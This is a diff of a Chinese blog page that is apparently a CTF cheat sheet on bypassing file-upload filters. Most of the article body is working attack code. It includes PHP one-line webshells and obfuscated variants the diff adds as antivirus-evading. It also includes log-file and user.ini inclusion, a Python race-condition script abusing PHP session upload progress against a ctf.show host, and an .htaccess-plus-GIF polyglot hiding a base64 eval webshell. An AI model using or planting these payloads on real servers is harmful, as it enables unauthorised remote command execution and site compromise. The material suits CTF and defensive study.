@@ -35,8 +35,8 @@
 <meta property="og:description" content="短标签1234567891011&lt;?php eval($_POST[&#x27;a&#x27;]) ?&gt;&lt;?php assert(@$_POST[&#x27;a&#x27;]); ?&gt;&lt;?&#x3D;eval($_POST[1]);?&gt;&lt;?&#x3D;eval($_POST&#123;1&#125;);?&gt;&lt;?&#x3D;system(&#x27;tac ..&#x2F;f*&amp;#x2">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-23T07:09:27.000Z">
-<meta property="article:modified_time" content="2025-03-23T07:24:28.170Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:modified_time" content="2025-09-14T04:33:08.365Z">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="upload">
 <meta name="twitter:card" content="summary">
   
@@ -50,6 +50,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -195,20 +203,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">1.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.2.</span> <span class="toc-text">session文件包含+条件竞争</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">1.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">免杀一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">文件解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">4.2.</span> <span class="toc-text">session文件包含+条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.3.</span> <span class="toc-text">.htaccess上传</span></a></li></ol></li></ol>
       
   </div>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -216,7 +224,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -281,7 +289,7 @@
       <div class="article-date">
   <a href="/2025/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-03-23T07:09:27.000Z" itemprop="datePublished">2025-03-23</time>
-    <time style="display: none;" id="post-update-time">2025-03-23</time>
+    <time style="display: none;" id="post-update-time">2025-09-14</time>
   </a>
 </div>
 
@@ -300,10 +308,15 @@
       
         <h2 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]) ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php assert(@$_POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST&#123;1&#125;);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>
 
-
-
+<p>cd &#x2F;tmp &amp;&amp; tar -xvf fmx.tar&amp;&amp;pwd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fun = create_function(&#x27;&#x27;,$_POST[&#x27;a&#x27;]);$fun();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@call_user_func(assert,$_POST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@preg_replace(&quot;/abcde/e&quot;, $_POST[&#x27;a&#x27;], &quot;abcdefg&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$bb=&quot;eval&quot;;</span><br><span class="line">$aa=&quot;bb&quot;;</span><br><span class="line">$$aa($_POST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<h2 id="免杀一句话木马"><a href="#免杀一句话木马" class="headerlink" title="免杀一句话木马"></a>免杀一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a=&quot;a&quot;.&quot;s&quot;;</span><br><span class="line">$b=&quot;s&quot;.&quot;e&quot;;</span><br><span class="line">$c=&quot;rt&quot;;</span><br><span class="line">$d=$a.$b.$c;</span><br><span class="line">$d($_REQUEST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">$b = explode(&quot;#&quot;,$a);</span><br><span class="line">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</span><br><span class="line">$c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42090431/article/details/137499632">常见的解析漏洞总结-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2402_83134109/article/details/144879139">文件解析漏洞-CSDN博客</a></p>
 <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><p>当过滤了php，执行函数，反引号等，不能在图片中藏一句话木马，并且过滤了关键字log，要用拼接绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、上传图片和user.ini，图片的内容为&lt;?include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br><span class="line">user.ini: auto_append_file=&quot;test.png&quot;</span><br><span class="line"></span><br><span class="line">2、修改ua头</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">3、已经包含了日志文件了，直接命令执行</span><br><span class="line">1=system(&quot;tac ../flag.php);</span><br></pre></td></tr></table></figure>
 
@@ -319,6 +332,15 @@
 <p>要用条件竞争</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=&#x27;wuqiong&#x27; #在test.png文件中自己命名的，可随意</span><br><span class="line">url1=&quot;http://c6580e50-39d6-45a3-bd87-60e2f42b3896.challenge.ctf.show/&quot; #记得将https中的s去掉</span><br><span class="line">url2=&quot;http://c6580e50-39d6-45a3-bd87-60e2f42b3896.challenge.ctf.show/upload/index.php&quot; #记得将https中的s去掉</span><br><span class="line">data1=&#123;</span><br><span class="line">	&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">	&#x27;file&#x27;:&#x27;wuqiong&#x27; #在test.png文件中自己命名的，可随意</span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">	&#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def read():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		if &#x27;flag&#x27; in r.text:</span><br><span class="line">			print(r.text)</span><br><span class="line">			</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">	t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<h3 id="htaccess上传"><a href="#htaccess上传" class="headerlink" title=".htaccess上传"></a>.htaccess上传</h3><p>Apache</p>
+<p>前提：能上传.htaccess文件和图片文件(png,jpg…)，且会过滤文件内容</p>
+<p>.htaccess：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.gif&quot;</span><br></pre></td></tr></table></figure>
+
+<p>1.gif：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">PD9waHAgZWNobyAiSmF5MTciO2V2YWwoJF9QT1NUWzFdKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p> <code>&lt;?php echo &quot;fmx&quot;;eval($_POST[1]);?&gt;</code></p>
 
       
     </div>
@@ -391,7 +413,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -402,10 +424,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -437,20 +459,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">1.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.2.</span> <span class="toc-text">session文件包含+条件竞争</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">1.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">免杀一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">文件解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">4.2.</span> <span class="toc-text">session文件包含+条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.3.</span> <span class="toc-text">.htaccess上传</span></a></li></ol></li></ol>
       
   </div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -458,7 +480,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -578,14 +600,14 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "文件上传绕过姿势",
           url: "http://example.com/2025/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/",
           excerpt: "",
           description: "",
-          stripContent: "短标签1234567891011&amp;lt;?php eval($_POST[&amp;#x27;a&amp;#x27;]) ?&amp;gt;&amp;lt;?php assert(@$_POST[&amp;#x27;a&amp;#x27;]); ?&amp;gt;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;lt;?=eval($_POST&amp;#123;1&amp;#125;);?&amp;gt;&amp;lt;?=system(&amp;#x27;tac ../f*&amp;#x27;)?&amp;gt;&amp;lt;?=`tac ../f*`?&amp;gt;    1234567891011121",
+          stripContent: "短标签1234567891011&amp;lt;?php eval($_POST[&amp;#x27;a&amp;#x27;]) ?&amp;gt;&amp;lt;?php assert(@$_POST[&amp;#x27;a&amp;#x27;]); ?&amp;gt;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;lt;?=eval($_POST&amp;#123;1&amp;#125;);?&amp;gt;&amp;lt;?=system(&amp;#x27;tac ../f*&amp;#x27;)?&amp;gt;&amp;lt;?=`tac ../f*`?&amp;gt;  cd &amp;#x2F;tmp &amp;amp;",
           date: "Sun Mar 23 2025 15:09:27 GMT+0800",
-          updated: "Sun Mar 23 2025 15:24:28 GMT+0800",
+          updated: "Sun Sep 14 2025 12:33:08 GMT+0800",
           cover: "/../images/1737907114de8a.jpg",
         };
       </script>
@@ -673,6 +695,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
